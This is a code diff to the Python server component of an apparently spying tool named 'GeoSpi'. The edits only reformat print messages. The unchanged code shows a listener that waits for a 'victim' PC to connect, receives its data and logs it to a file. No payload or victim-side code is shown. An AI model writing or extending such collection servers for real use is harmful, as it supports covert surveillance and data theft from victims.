@@ -39,20 +39,20 @@ class Server:
         """
         This function start server and start listen message from client
         """
-        print("Server creato")
+        print(f"<{'-' * 10} Server online!{'-' * 10}>")
         self.server.listen()
-        print("Server in ascolto")
+        print(f"<{'-' * 10} Server in listening{'-' * 10}>")
         conn, add = self.server.accept()
         file = open("logs.txt", "a")
         i = True
-        print(f"<-----------Pc of victim found, GeoSpi in communication...\nInfo: {add}----------->")
+        print(f"<{'-' * 10}Pc of victim found, GeoSpi in communication...\nInfo: {add}{'-' * 10}>")
         with file:
             with conn:
                 while True:
                     data = conn.recv(1024)
                     data = data.decode()
                     if not data:
-                        print("error in data, maybe client stop the connexion")
+                        print(f"{'-' * 10}Error in data, maybe client stop the connexion{'-' * 10}")
                         self.set_server()
                         break
                     if i:
